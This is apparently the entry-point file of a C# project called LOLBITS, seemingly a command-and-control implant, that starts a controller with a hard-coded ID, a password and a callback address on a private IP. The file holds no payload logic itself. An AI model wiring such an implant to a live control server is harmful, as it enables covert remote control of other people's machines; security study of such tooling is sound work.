﻿using LOLBITS.Controlling;

namespace LOLBITS
{
    public class Program
    {
        private const string FirstId = "abcde1234";
        private const string Url = "http://192.168.1.69/";
        private const string Password = "password";
        
        static void Main(string[] args)
        {
            var c = new Controller(FirstId, Url, Password);
            c.Start();
        }
    }
}
